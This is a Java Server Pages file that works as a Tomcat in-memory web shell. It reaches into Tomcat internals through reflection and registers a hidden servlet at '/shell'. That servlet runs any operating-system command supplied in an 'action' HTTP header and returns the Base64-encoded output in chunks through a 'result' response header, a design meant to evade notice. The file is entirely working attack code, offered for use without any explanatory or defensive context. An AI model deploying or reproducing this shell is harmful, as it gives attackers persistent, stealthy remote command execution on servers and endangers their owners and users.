<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.coyote.ProtocolHandler" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.Enumeration" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>

<%!

    public class Shell_Servlet implements Servlet {
        final StringBuilder result = new StringBuilder();
        public void doAction(ServletRequest req, ServletResponse res) {
            try {
                HttpServletRequest httpReq = (HttpServletRequest) req;
                HttpServletResponse httpRes = (HttpServletResponse) res;
                //获取内部Tomcat Request
                Request tomcatReq;
                try {
                    Field reqField = httpReq.getClass().getDeclaredField("request");
                    reqField.setAccessible(true);
                    tomcatReq = (Request) reqField.get(httpReq);
                } catch (NoSuchFieldException ignored) {
                    Method getReqM = httpReq.getClass().getMethod("getRequest");
                    tomcatReq = (Request) getReqM.invoke(httpReq);
                }
                //获取内部Tomcat Response
                Response tomcatRes;
                try {
                    Field resField = httpRes.getClass().getDeclaredField("response");
                    resField.setAccessible(true);
                    tomcatRes = (Response) resField.get(httpRes);
                } catch (NoSuchFieldException ignored) {
                    Method getResM = httpRes.getClass().getMethod("getResponse");
                    tomcatRes = (Response) getResM.invoke(httpRes);
                }

                // 防止拦截器内存马执行两次
                if (tomcatRes.getHeader("result") == null) {
                    try {
                        String action = tomcatReq.getHeader("action");

                        if ("getResult".equals(action)) {
                            if (result == null || result.length() == 0) {
                                String msg = "result is null";
                                tomcatRes.setHeader("result", msg);
                                return;
                            }
                            // 获取 maxHttpHeaderSize
                            Connector connector = tomcatReq.getConnector();
                            Method getProtocolHandler = Connector.class.getMethod("getProtocolHandler");
                            Object handlerObj = getProtocolHandler.invoke(connector);
                            int maxHttpHeaderSize;
                            if (handlerObj instanceof AbstractHttp11Protocol) {
                                maxHttpHeaderSize = ((AbstractHttp11Protocol<?>) handlerObj).getMaxHttpHeaderSize();
                            } else {
                                maxHttpHeaderSize = 8192;
                            }
                            // 估算可传输 result 的长度
                            int headerUsed = 0;
                            Enumeration<String> headerNames = tomcatReq.getHeaderNames();
                            while (headerNames.hasMoreElements()) {
                                String headerName = headerNames.nextElement();
                                if ("result".equalsIgnoreCase(headerName)) continue;
                                String headerValue = tomcatReq.getHeader(headerName);
                                if (headerValue != null) {
                                    headerUsed += headerName.length() + headerValue.length() + 4; // ": " + "\r\n"
                                }
                            }
                            headerUsed += 2; // 结尾 \r\n
                            int avail = maxHttpHeaderSize - headerUsed - 20;

                            String remaining = (String) tomcatReq.getAttribute("remainingBase64");
                            if (remaining == null) {
                                remaining = result.toString();
                            }

                            int takeLen = Math.min(avail, remaining.length());
                            String part = remaining.substring(0, takeLen);
                            String nextRem = remaining.substring(takeLen);

                            tomcatReq.setAttribute("remainingBase64", nextRem);

                            if (result.length() >= takeLen) {
                                result.delete(0, takeLen);
                            }

                            tomcatRes.setHeader("result", part);
                            tomcatRes.setHeader("Remain", String.valueOf(nextRem.length()));

                        } else if (action != null) {
                            result.setLength(0);
                            try {
                                Process process = Runtime.getRuntime().exec(action);
                                StringBuilder outBuf = new StringBuilder();
                                StringBuilder errBuf = new StringBuilder();

                                Thread tOut = new Thread(() -> {
                                    try (BufferedReader r = new BufferedReader(
                                            new InputStreamReader(process.getInputStream(), "GBK"))) {
                                        String l;
                                        while ((l = r.readLine()) != null) {
                                            outBuf.append(l).append("\n");
                                        }
                                    } catch (IOException ignored) {
                                    }
                                });
                                Thread tErr = new Thread(() -> {
                                    try (BufferedReader r = new BufferedReader(
                                            new InputStreamReader(process.getErrorStream(), "GBK"))) {
                                        String l;
                                        while ((l = r.readLine()) != null) {
                                            errBuf.append(l).append("\n");
                                        }
                                    } catch (IOException ignored) {
                                    }
                                });
                                tOut.start();
                                tErr.start();
                                int exitCode = process.waitFor();
                                tOut.join();
                                tErr.join();

                                String combined;
                                if (outBuf.length() > 0 || errBuf.length() > 0) {
                                    combined = outBuf.toString() + errBuf.toString();
                                } else {
                                    combined = "Process exitCode:" + exitCode;
                                }
                                String b64Output = Base64.getEncoder()
                                        .encodeToString(combined.getBytes("GBK"));
                                result.append(b64Output);
                                String msg = "execute success";
                                tomcatRes.setHeader("result", msg);
                            } catch (Exception ex) {
                                result.setLength(0);
                                String errMsg = ex.getMessage();
                                String b64Err = Base64.getEncoder()
                                        .encodeToString(errMsg.getBytes("GBK"));
                                result.append(b64Err);

                                String msg = "execute fail";
                                tomcatRes.setHeader("result", msg);
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        String err = "internal error";
                        String b64Err = Base64.getEncoder()
                                .encodeToString(err.getBytes("GBK"));
                        tomcatRes.setHeader("result", b64Err);
                    }
                }
            } catch (Exception e) {
            }
        }

        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
          doAction(req,res);

        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }

%>

<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
